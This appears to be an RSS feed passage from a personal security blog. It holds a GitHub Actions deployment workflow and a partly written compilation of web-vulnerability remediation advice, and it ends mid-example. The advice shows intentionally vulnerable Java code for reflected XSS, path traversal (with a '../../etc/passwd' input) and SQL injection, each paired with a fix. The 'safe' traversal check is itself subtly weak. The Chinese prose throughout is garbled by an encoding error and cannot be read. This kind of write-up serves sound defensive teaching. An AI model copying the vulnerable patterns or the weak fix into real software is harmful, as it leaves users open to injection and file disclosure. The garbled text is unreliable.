<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>SpringKill_æ˜¥çº±</title><description>SpringKill</description><link>https://www.springkill.club/</link><language>zh_CN</language><item><title>è‡ªåŠ¨éƒ¨ç½²</title><link>https://www.springkill.club/posts/%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/</link><guid isPermaLink="true">https://www.springkill.club/posts/%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/</guid><pubDate>Tue, 15 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;è‡ªåŠ¨éƒ¨ç½²github blog&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;# å·¥ä½œæµåç§°
name: Deploy Hexo to GitHub Pages

# è§¦å‘å™¨ï¼šåœ¨ push åˆ° main åˆ†æ”¯æ—¶è§¦å‘
# workflow_dispatch å…è®¸ä½ ä» Actions é¡µé¢æ‰‹åŠ¨è§¦å‘æ­¤å·¥ä½œæµ
on:
  push:
    branches:
      - main  # ä½ çš„ Hexo æºæ–‡ä»¶æ‰€åœ¨çš„åˆ†æ”¯
  workflow_dispatch:

# Job é…ç½®
jobs:
  build-and-deploy:
    # è¿è¡Œç¯å¢ƒ
    runs-on: ubuntu-latest

    # æ­¥éª¤
    steps:
      # æ­¥éª¤ä¸€ï¼šæ£€å‡ºä½ çš„æºæ–‡ä»¶ä»“åº“ä»£ç 
      - name: Checkout ğŸ›ï¸
        uses: actions/checkout@v4
        with:
          # â€œsubmodules: &apos;recursive&apos;â€ è§£å†³äº† Hexo ä¸»é¢˜é€šå¸¸ä½œä¸ºå­æ¨¡å—çš„é—®é¢˜
          submodules: &apos;recursive&apos;

      # æ­¥éª¤äºŒï¼šè®¾ç½® Node.js ç¯å¢ƒ
      - name: Set up Node.js ğŸŸ©
        uses: actions/setup-node@v4
        with:
          node-version: &apos;24&apos; # ä½ å¯ä»¥æŒ‡å®šä½ çš„é¡¹ç›®æ‰€éœ€çš„ Node.js ç‰ˆæœ¬
          cache: &apos;npm&apos; # ç¼“å­˜ npm ä¾èµ–ï¼ŒåŠ å¿«åç»­æ„å»ºé€Ÿåº¦

      # æ­¥éª¤ä¸‰ï¼šå®‰è£…ä¾èµ–é¡¹
      - name: Install Dependencies ğŸ“¦
        run: npm install

      # æ­¥éª¤å››ï¼šç”Ÿæˆé™æ€æ–‡ä»¶
      - name: Generate Static Files âš™ï¸
        run: npx hexo generate # ä½¿ç”¨ npx æ‰§è¡Œæœ¬åœ°å®‰è£…çš„ hexo-cli

      # æ­¥éª¤äº”ï¼šéƒ¨ç½²åˆ° GitHub Pages
      - name: Deploy to GitHub Pages ğŸš€
        uses: peaceiris/actions-gh-pages@v4
        with:
          # åˆšåˆšåœ¨ä»“åº“ Secrets ä¸­åˆ›å»ºçš„ Personal Access Token
          personal_token: ${{ secrets.HEXO_DEPLOY_TOKEN }}
          # è¦éƒ¨ç½²åˆ°çš„ç›®æ ‡ä»“åº“ï¼Œæ ¼å¼ä¸º &amp;lt;ç”¨æˆ·å&amp;gt;/&amp;lt;ä»“åº“å&amp;gt;
          # ä¾‹å¦‚: &apos;your-username/your-username.github.io&apos;
          external_repository: springkill/springkill.github.io
          # Hexo ç”Ÿæˆçš„é™æ€æ–‡ä»¶é»˜è®¤åœ¨ public ç›®å½•
          publish_dir: ./public
          # è¦æ¨é€åˆ°çš„ç›®æ ‡åˆ†æ”¯
          publish_branch: master # å¯¹äºç”¨æˆ·/ç»„ç»‡é¡µé¢ï¼Œé€šå¸¸æ˜¯ main æˆ– master
          # éƒ¨ç½²æäº¤çš„ä½œè€…ä¿¡æ¯
          user_name: &apos;springkill&apos;
          user_email: &apos;zzz.love.study@gmail.com&apos;
          # éƒ¨ç½²æäº¤çš„æ¶ˆæ¯
          commit_message: &quot;ğŸš€ Deploy from Hexo source repo @ ${{ github.sha }}&quot;
          # æ¸…ç†ç›®æ ‡åˆ†æ”¯ï¼Œåªä¿ç•™æœ¬æ¬¡éƒ¨ç½²çš„æ–‡ä»¶
          keep_files: false
&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>ä¿®å¤å»ºè®®æ±‡æ€»</title><link>https://www.springkill.club/posts/%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE%E6%B1%87%E6%80%BB/</link><guid isPermaLink="true">https://www.springkill.club/posts/%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE%E6%B1%87%E6%80%BB/</guid><pubDate>Thu, 12 Sep 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Webæ¼æ´&lt;/h1&gt;
&lt;p&gt;ä¸»è¦æ˜¯ä¸ºäº†å†™æŠ¥å‘Šçš„æ—¶å€™å¤åˆ¶ç²˜è´´æ–¹ä¾¿â€¦â€¦&lt;/p&gt;
&lt;h2&gt;åå°„å‹XSS&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
åå°„è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰æ˜¯ç½‘ç»œåº”ç”¨ç¨‹åºä¸­å¸¸è§çš„ä¸€ç§å®‰å…¨æ¼æ´ã€‚å½“æ”»å‡»è€…å°†æ¶æ„è„šæœ¬æ³¨å…¥ç½‘ç»œåº”ç”¨ç¨‹åºï¼Œç„¶ååå°„ç»™ç”¨æˆ·æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚å½“åº”ç”¨ç¨‹åºåœ¨è¾“å‡º HTML å†…å®¹ä¸­åŒ…å«ç”¨æˆ·è¾“å…¥è€Œæœªå¯¹å…¶è¿›è¡Œé€‚å½“çš„æ¶ˆæ¯’æˆ–éªŒè¯æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚
æ”»å‡»è€…å¯åˆ©ç”¨åå°„ XSS æ¼æ´åœ¨å—å®³è€…æµè§ˆå™¨çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ¶æ„è„šæœ¬ï¼Œä»è€Œå¯èƒ½å¯¼è‡´å„ç§å®‰å…¨é£é™©ï¼Œå¦‚çªƒå– cookieã€ä¼šè¯åŠ«æŒã€ç½‘é¡µç¯¡æ”¹æˆ–ç½‘ç»œé’“é±¼æ”»å‡»ã€‚
ä¾‹å¦‚å¦‚ä¸‹ä»£ç å°†ç”¨æˆ·è¾“å…¥ç›´æ¥æ‹¼æ¥åˆ°ç½‘é¡µä¸­è¿”å›ç»™ç”¨æˆ·ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import java.io.IOException;
import java.io.PrintWriter;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class VulnerableServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String userInput = request.getParameter(&quot;input&quot;); // Vulnerable to XSS

        response.setContentType(&quot;text/html&quot;);
        PrintWriter out = response.getWriter();
        out.println(&quot;&amp;lt;html&amp;gt;&quot;);
        out.println(&quot;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Reflection XSS Vulnerability Example&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&quot;);
        out.println(&quot;&amp;lt;body&amp;gt;&quot;);
        out.println(&quot;&amp;lt;h1&amp;gt;Hello, &quot; + userInput + &quot;!&amp;lt;/h1&amp;gt;&quot;); // Vulnerable to XSS
        out.println(&quot;&amp;lt;/body&amp;gt;&quot;);
        out.println(&quot;&amp;lt;/html&amp;gt;&quot;);
        out.close();
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;è¾“å…¥éªŒè¯å’Œæ¶ˆæ¯’ï¼šåœ¨å‘ç”¨æˆ·æ˜¾ç¤ºæ‰€æœ‰ç”¨æˆ·è¾“å…¥ä¹‹å‰å¯¹å…¶è¿›è¡ŒéªŒè¯å’Œæ¶ˆæ¯’ã€‚è¿™åŒ…æ‹¬ç¡®ä¿è¾“å…¥ä¸åŒ…å«ä»»ä½• HTMLã€JavaScript æˆ–å…¶ä»–å¯æ‰§è¡Œä»£ç ã€‚&lt;/li&gt;
&lt;li&gt;è¾“å‡ºç¼–ç ï¼šåœ¨ HTML ä¸­æ˜¾ç¤ºç”¨æˆ·è¾“å…¥æ—¶å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œé˜²æ­¢æµè§ˆå™¨å°†å…¶è§£é‡Šä¸ºå¯æ‰§è¡Œä»£ç ã€‚ä½¿ç”¨ç¼–ç¨‹è¯­è¨€æˆ–ç½‘ç»œæ¡†æ¶æä¾›çš„ç¼–ç åº“æˆ–æ¡†æ¶ã€‚&lt;/li&gt;
&lt;li&gt;å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰ï¼šå®æ–½ä¸¥æ ¼çš„å†…å®¹å®‰å…¨ç­–ç•¥ï¼Œæ§åˆ¶å“ªäº›èµ„æºï¼ˆå¦‚è„šæœ¬ã€æ ·å¼è¡¨ã€å­—ä½“ï¼‰å¯è¢«ç½‘ç»œåº”ç”¨ç¨‹åºåŠ è½½ã€‚é€šè¿‡é™åˆ¶å¯æ‰§è¡Œè„šæœ¬çš„æ¥æºï¼Œè¿™æœ‰åŠ©äºå‡è½» XSS æ”»å‡»çš„å½±å“ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨æ¡†æ¶å’Œåº“ï¼šåˆ©ç”¨å¯æä¾›å†…ç½® XSS æ¼æ´é˜²æŠ¤çš„æˆç†Ÿæ¡†æ¶å’Œåº“ã€‚è¿™äº›å·¥å…·é€šå¸¸åŒ…æ‹¬è‡ªåŠ¨è¾“å…¥éªŒè¯å’Œè¾“å‡ºç¼–ç åŠŸèƒ½ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä¾‹å¦‚å¦‚ä¸‹ä¾‹å­ï¼Œæˆ‘ä»¬ä½¿ç”¨ Apache Commons Text åº“ä¸­çš„ StringEscapeUtils.escapeHtml4() æ–¹æ³•å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œ HTML ç¼–ç ï¼Œç„¶åå†æ˜¾ç¤ºç»™ç”¨æˆ·ã€‚è¿™æ ·å¯ä»¥ç¡®ä¿ä»»ä½•æ½œåœ¨çš„æ¶æ„è„šæœ¬æ ‡è®°æˆ– HTML å†…å®¹éƒ½ä¼šè¢«è½¬ä¹‰ï¼Œå¹¶ä»¥çº¯æ–‡æœ¬å½¢å¼å‘ˆç°ï¼Œä»è€Œé˜²æ­¢ XSS æ”»å‡»ã€‚ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import org.apache.commons.text.StringEscapeUtils; // Using Apache Commons Text library for HTML escaping

public class XSSExample {
    public static void main(String[] args) {
        // Simulated user input (potentially malicious)
        String userInput = &quot;&amp;lt;script&amp;gt;alert(&apos;XSS Attack!&apos;);&amp;lt;/script&amp;gt;&quot;;

        // Encode user input to prevent XSS
        String safeOutput = StringEscapeUtils.escapeHtml4(userInput);

        // Displaying the safe output
        System.out.println(&quot;Safe Output: &quot; + safeOutput);
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;å­˜å‚¨å‹XSS&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;DOMå‹XSS&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
DOMå‹XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰æ˜¯ä¸€ç§é€šè¿‡å®¢æˆ·ç«¯è„šæœ¬ï¼ˆé€šå¸¸æ˜¯JavaScriptï¼‰åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œæ¶æ„ä»£ç çš„æ”»å‡»æ–¹å¼ã€‚åœ¨DOMå‹XSSä¸­ï¼Œæ”»å‡»è€…åˆ©ç”¨ç½‘é¡µä¸­çš„è„šæœ¬å¯¹DOMï¼ˆæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰è¿›è¡Œæ“ä½œï¼Œä»¥æ’å…¥æ¶æ„è„šæœ¬ã€‚ä¸å…¶ä»–ç±»å‹çš„XSSä¸åŒï¼ŒDOMå‹XSSä¸éœ€è¦æœåŠ¡å™¨å¤„ç†æ¶æ„æ•°æ®ï¼›æ¶æ„è„šæœ¬æ˜¯åœ¨æµè§ˆå™¨ç«¯æ‰§è¡Œçš„ï¼Œé€šå¸¸æ˜¯å› ä¸ºé¡µé¢è„šæœ¬ä¸æ­£ç¡®åœ°å¤„ç†ç”¨æˆ·è¾“å…¥å¯¼è‡´çš„ã€‚è¿™ç§æ”»å‡»èƒ½å¤Ÿç›—å–ç”¨æˆ·çš„ä¼šè¯ã€ä¿®æ”¹ç½‘é¡µå†…å®¹æˆ–è¿›è¡Œå…¶ä»–æ¶æ„è¡Œä¸ºã€‚
&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œé€‚å½“çš„éªŒè¯å’Œç¼–ç ï¼šç¡®ä¿æ‰€æœ‰ç”¨æˆ·è¾“å…¥åœ¨æ’å…¥DOMä¹‹å‰éƒ½ç»è¿‡é€‚å½“çš„æ¸…ç†å’Œè½¬ä¹‰ã€‚é¿å…å°†ä¸å¯ä¿¡çš„è¾“å…¥ç›´æ¥ç”¨äºDOMæ“ä½œã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨å®‰å…¨çš„APIï¼šå°½é‡ä½¿ç”¨ä¸ä¼šè§£æHTMLçš„å®‰å…¨APIï¼Œå¦‚textContentè€Œä¸æ˜¯innerHTMLï¼Œä»¥åŠä½¿ç”¨Element.setAttributeæ¥è®¾ç½®å±æ€§å€¼ï¼Œè€Œä¸æ˜¯ç›´æ¥æ“ä½œå±æ€§ã€‚&lt;/li&gt;
&lt;li&gt;å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰ï¼šå®æ–½åˆé€‚çš„å†…å®¹å®‰å…¨ç­–ç•¥ï¼Œç‰¹åˆ«æ˜¯é™åˆ¶æ‰§è¡Œå†…è”JavaScriptå’Œæœªç»æˆæƒçš„å¤–éƒ¨è„šæœ¬ã€‚&lt;/li&gt;
&lt;li&gt;åˆ©ç”¨æ¡†æ¶çš„é˜²æŠ¤åŠŸèƒ½ï¼šä½¿ç”¨ç°ä»£Webæ¡†æ¶ï¼ˆå¦‚React, Angular, Vueç­‰ï¼‰æä¾›çš„XSSé˜²æŠ¤æœºåˆ¶ã€‚è¿™äº›æ¡†æ¶é€šå¸¸ä¼šè‡ªåŠ¨å¤„ç†è®¸å¤šæ½œåœ¨çš„XSSæ”»å‡»ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;ç›®å½•éå†&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
ç›®å½•éå†ï¼ˆåˆç§°è·¯å¾„éå†ï¼‰æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…åˆ©ç”¨è¿™ç§æ¼æ´å¯ä»¥è®¿é—®å­˜å‚¨åœ¨æœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œåº”ç”¨ç¨‹åºç›®æ ‡ç›®å½•ä¹‹å¤–çš„æ–‡ä»¶å’Œç›®å½•ã€‚é€šè¿‡æ„é€ åŒ…å«å¦‚â€œ../â€ï¼ˆå‘ä¸Šå¯¼èˆªï¼‰çš„è¾“å…¥ï¼Œæ”»å‡»è€…å¯ä»¥æ“æ§åº”ç”¨ç¨‹åºæ¥è®¿é—®æœ¬ä¸åº”è¯¥è¢«è®¿é—®çš„æ–‡ä»¶ç³»ç»Ÿè·¯å¾„ã€‚è¿™å¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œä¾‹å¦‚é…ç½®æ–‡ä»¶ã€å¯†ç æ–‡ä»¶ç­‰ï¼Œæˆ–è€…å…è®¸æ”»å‡»è€…ä¿®æ”¹ç³»ç»Ÿæ–‡ä»¶æˆ–æ‰§è¡Œæ¶æ„ä»£ç ï¼Œå¯¹ç³»ç»Ÿå®‰å…¨æ„æˆä¸¥é‡å¨èƒã€‚
ä¾‹å¦‚ä¸‹åˆ—ä»£ç ï¼ŒfilePathå˜é‡ç”±å¤–éƒ¨ä¼ å…¥ï¼Œå¦‚ä¼ å…¥&quot;../../etc/passwd&quot;ç±»ä¼¼å­—æ®µï¼Œé‚£ä¹ˆå¯èƒ½è®¿é—®åˆ°ä¸åº”è¯¥è¢«è®¿é—®çš„ç³»ç»Ÿæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class DirectoryTraversalVulnerable {
    public byte[] readFile(String filePath) throws IOException {
        File file = new File(filePath);
        FileInputStream fis = new FileInputStream(file);
        byte[] data = new byte[(int) file.length()];
        fis.read(data);
        fis.close();
        return data;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;è¾“å…¥éªŒè¯ï¼šå¯¹æ‰€æœ‰è¾“å…¥è·¯å¾„è¿›è¡Œä¸¥æ ¼éªŒè¯ã€‚æ‹’ç»æˆ–ç§»é™¤è¾“å…¥ä¸­çš„ä»»ä½•å°è¯•è®¿é—®å½“å‰ç›®å½•ä¹‹å¤–èµ„æºçš„å°è¯•ï¼Œå¦‚ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤æ‰â€œ../â€ç­‰åºåˆ—ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨å®‰å…¨çš„APIï¼šä½¿ç”¨æ–‡ä»¶è®¿é—®ç›¸å…³çš„å®‰å…¨APIï¼Œç¡®ä¿APIé€»è¾‘ä¸­å·²ç»è€ƒè™‘å¹¶å¤„ç†äº†ç›®å½•éå†çš„é£é™©ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨ç™½åå•ï¼šåˆ›å»ºå¹¶ç»´æŠ¤ä¸€ä¸ªå…è®¸è®¿é—®çš„æ–‡ä»¶è·¯å¾„ç™½åå•ï¼Œç¡®ä¿åªæœ‰ç™½åå•ä¸Šçš„æ–‡ä»¶æ‰èƒ½è¢«è®¿é—®ã€‚&lt;/li&gt;
&lt;li&gt;æƒé™æœ€å°åŒ–ï¼šé™åˆ¶åº”ç”¨ç¨‹åºçš„æ–‡ä»¶ç³»ç»Ÿè®¿é—®æƒé™ï¼Œä»…å…è®¸è®¿é—®å¿…è¦çš„æ–‡ä»¶å’Œç›®å½•ï¼Œå‡å°‘å®‰å…¨æ¼æ´å¸¦æ¥çš„æ½œåœ¨é£é™©ã€‚&lt;/li&gt;
&lt;li&gt;é”™è¯¯å¤„ç†ï¼šæ­£ç¡®å¤„ç†æ–‡ä»¶è®¿é—®é”™è¯¯ï¼Œé¿å…é€šè¿‡é”™è¯¯ä¿¡æ¯æ³„éœ²æœåŠ¡å™¨æ–‡ä»¶ç»“æ„æˆ–æ•æ„Ÿä¿¡æ¯ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä¾‹å¦‚å¦‚ä¸‹ä»£ç ï¼Œä½¿ç”¨basePathå®šä¹‰äº†ä¸€ä¸ªå®‰å…¨çš„åŸºç¡€ç›®å½•ï¼Œæ‰€æœ‰çš„æ–‡ä»¶è®¿é—®éƒ½é™å®šåœ¨è¿™ä¸ªç›®å½•æˆ–å…¶å­ç›®å½•å†…ã€‚ä½¿ç”¨File.getCanonicalPath()æ–¹æ³•å¯ä»¥è§£æå‡ºç»å¯¹è·¯å¾„ï¼Œå¹¶æ£€æŸ¥è¯¥è·¯å¾„æ˜¯å¦ä»¥æŒ‡å®šçš„å®‰å…¨åŸºè·¯å¾„å¼€å§‹ã€‚å¦‚æœå°è¯•è®¿é—®å…¶ä»–ç›®å½•ï¼Œç³»ç»Ÿä¼šæŠ›å‡ºå®‰å…¨å¼‚å¸¸ï¼Œä»è€Œé˜²æ­¢äº†ç›®å½•éå†æ”»å‡»ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class DirectoryTraversalSafe {
    private final String basePath = &quot;/var/data/appfiles&quot;;  // å®‰å…¨åŸºè·¯å¾„

    public byte[] readFile(String filePath) throws IOException {
        File file = new File(basePath, filePath);
        if (!file.getCanonicalPath().startsWith(basePath)) {
            throw new SecurityException(&quot;Attempted directory traversal attack&quot;);
        }
        FileInputStream fis = new FileInputStream(file);
        byte[] data = new byte[(int) file.length()];
        fis.read(data);
        fis.close();
        return data;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;SQLæ³¨å…¥&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
SQLæ³¨å…¥æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡åœ¨SQLæŸ¥è¯¢ä¸­æ³¨å…¥æ¶æ„çš„SQLä»£ç ï¼Œä»è€Œèƒ½å¤Ÿæ“æ§æ•°æ®åº“ã€‚è¿™ç§æ”»å‡»å¯ä»¥è®©æ”»å‡»è€…ç»•è¿‡èº«ä»½éªŒè¯ã€çªƒå–ã€ä¿®æ”¹æˆ–åˆ é™¤æ•°æ®ã€‚SQLæ³¨å…¥é€šå¸¸å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºä½¿ç”¨ç”¨æˆ·è¾“å…¥æ¥æ„é€ SQLæŸ¥è¯¢æ—¶ï¼Œå¦‚æœæ²¡æœ‰é€‚å½“çš„è¾“å…¥å¤„ç†æˆ–å‚æ•°åŒ–æŸ¥è¯¢ï¼Œå°±ä¼šå…è®¸æ”»å‡»è€…æ³¨å…¥æ¶æ„çš„SQLä»£ç ã€‚è¿™ç§æ¼æ´å¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²ã€æ•°æ®ä¸¢å¤±å’Œå…¶ä»–ä¸¥é‡çš„åæœã€‚
ä¾‹å¦‚å¦‚ä¸‹ä»£ç ç›´æ¥å°†ç”¨æˆ·è¾“å…¥æ‹¼æ¥åˆ°SQLè¯­å¥ä¸­ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class SqlInjectionVulnerable {
    public void getUser(String username) {
        Connection conn = null;
        Statement stmt = null;
        try {
            conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost/testdb&quot;, &quot;user&quot;, &quot;password&quot;);
            stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery(&quot;SELECT * FROM users WHERE username = &apos;&quot; + username + &quot;&apos;&quot;);
            while (rs.next()) {
                // å¤„ç†ç»“æœ
            }
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try { if (stmt != null) stmt.close(); } catch (SQLException e) { }
            try { if (conn != null) conn.close(); } catch (SQLException e) { }
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å‚æ•°åŒ–æŸ¥è¯¢ï¼šä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢æ˜¯é˜²æ­¢SQLæ³¨å…¥çš„æœ€æœ‰æ•ˆæ‰‹æ®µã€‚å‚æ•°åŒ–æŸ¥è¯¢ç¡®ä¿äº†SQLè¯­å¥çš„ç»“æ„ä¸ä¼šå› ä¼ å…¥çš„æ•°æ®è€Œæ”¹å˜ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ï¼šé¢„ç¼–è¯‘è¯­å¥ï¼ˆä¾‹å¦‚åœ¨Javaä¸­çš„PreparedStatementï¼‰ä¸å‚æ•°åŒ–æŸ¥è¯¢ç±»ä¼¼ï¼Œå¯ä»¥æœ‰æ•ˆé˜²æ­¢SQLæ³¨å…¥ï¼Œå› ä¸ºå®ƒä»¬å°†SQLè¯­å¥çš„ç»“æ„ä¸æ•°æ®åˆ†å¼€å¤„ç†ã€‚&lt;/li&gt;
&lt;li&gt;è¾“å…¥éªŒè¯ï¼šå¯¹æ‰€æœ‰ç”¨æˆ·è¾“å…¥è¿›è¡ŒéªŒè¯ï¼Œæ‹’ç»ä»»ä½•å¯ç–‘çš„è¾“å…¥ã€‚è™½ç„¶è¿™ä¸èƒ½å•ç‹¬é˜²æ­¢SQLæ³¨å…¥ï¼Œä½†å¯ä»¥å‡å°‘æ˜“å—æ”»å‡»çš„æ”»å‡»é¢ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨ORMæ¡†æ¶ï¼šå¯¹è±¡å…³ç³»æ˜ å°„ï¼ˆORMï¼‰æ¡†æ¶å¦‚Hibernateæˆ–JPAé€šå¸¸ä¼šä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢å’Œå…¶ä»–å®‰å…¨æªæ–½ï¼Œè¿™å¯ä»¥å¸®åŠ©å‡å°‘ç›´æ¥SQLæ³¨å…¥çš„é£é™©ã€‚&lt;/li&gt;
&lt;li&gt;æœ€å°æƒé™åŸåˆ™ï¼šç¡®ä¿æ•°æ®åº“è´¦æˆ·ä»…å…·æœ‰æ‰§è¡Œå¿…è¦æ“ä½œçš„æƒé™ï¼Œè¿™å¯ä»¥å‡å°‘åœ¨SQLæ³¨å…¥æ”»å‡»æˆåŠŸæ—¶å¯è¢«æ”»å‡»è€…åˆ©ç”¨çš„æ•°æ®ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä¾‹å¦‚å¦‚ä¸‹ä»£ç ä½¿ç”¨PreparedStatementå’Œè®¾ç½®å‚æ•°ï¼Œæœ‰æ•ˆåœ°é˜²æ­¢äº†SQLæ³¨å…¥çš„å¯èƒ½æ€§ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class SqlInjectionSafe {
    public void getUser(String username) {
        Connection conn = null;
        PreparedStatement pstmt = null;
        try {
            conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost/testdb&quot;, &quot;user&quot;, &quot;password&quot;);
            pstmt = conn.prepareStatement(&quot;SELECT * FROM users WHERE username = ?&quot;);
            pstmt.setString(1, username);
            ResultSet rs = pstmt.executeQuery();
            while (rs.next()) {
                // å¤„ç†ç»“æœ
            }
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try { if (pstmt != null) pstmt.close(); } catch (SQLException e) { }
            try { if (conn != null) conn.close(); } catch (SQLException e) { }
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;SQLæ³¨å…¥ï¼ˆMybatisï¼‰&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
åœ¨Mybatisä¸­ï¼Œä½¿ç”¨${}ç¬¦å·æ¥è¿›è¡Œå˜é‡çš„æ›¿æ¢æ˜¯ä¸€ç§å¸¸è§åšæ³•ã€‚è¿™ç§æ›¿æ¢ä¼šç›´æ¥å°†å˜é‡çš„å€¼åµŒå…¥åˆ°SQLè¯­å¥ä¸­ï¼Œè€Œä¸ä¼šåƒ#{}é‚£æ ·è¿›è¡Œé¢„å¤„ç†å’Œå‚æ•°ç»‘å®šã€‚è™½ç„¶${}çš„ä½¿ç”¨å¯ä»¥æä¾›çµæ´»çš„åŠ¨æ€SQLæ”¯æŒï¼Œä½†å®ƒä¹Ÿå¸¦æ¥äº†æ˜¾è‘—çš„å®‰å…¨éšæ‚£ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†ä¸å¯ä¿¡çš„ç”¨æˆ·è¾“å…¥æ—¶ã€‚å¦‚æœç›´æ¥å°†ç”¨æˆ·è¾“å…¥é€šè¿‡${}åµŒå…¥åˆ°SQLè¯­å¥ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„è¾“å…¥å€¼æ¥æ”¹å˜SQLè¯­å¥çš„ç»“æ„ï¼Œæ‰§è¡Œéæ³•çš„æ•°æ®åº“æ“ä½œï¼Œä»è€Œå¯¼è‡´SQLæ³¨å…¥æ¼æ´ã€‚è¿™ç§æ¼æ´ä½¿å¾—æ”»å‡»è€…å¯èƒ½è¯»å–æœªæˆæƒçš„æ•°æ®ã€ç¯¡æ”¹æ•°æ®ç”šè‡³å®Œå…¨ç ´åæ•°æ®åº“ï¼Œå¯¹ç³»ç»Ÿå®‰å…¨é€ æˆä¸¥é‡å¨èƒã€‚
ä¾‹å¦‚å¦‚ä¸‹çš„é…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨äº†${}æ¥æ‹¼æ¥sqlè¯­å¥ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;mapper namespace=&quot;com.example.mapper.UserMapper&quot;&amp;gt;
    &amp;lt;select id=&quot;findUserByUsername&quot; resultType=&quot;com.example.model.User&quot;&amp;gt;
